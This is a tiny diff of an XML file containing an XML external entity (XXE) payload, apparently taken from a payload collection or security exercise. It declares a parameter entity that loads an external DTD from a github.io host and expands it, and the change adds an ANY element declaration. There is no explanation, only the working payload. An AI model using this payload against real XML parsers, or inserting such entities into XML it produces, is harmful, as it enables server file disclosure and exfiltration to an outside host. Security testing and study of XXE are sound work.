@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
+<!DOCTYPE foo [ <!ELEMENT title ANY >
 <!ENTITY % xxe SYSTEM "https://annie-te.github.io/external.dtd">
 %xxe;
 ]>
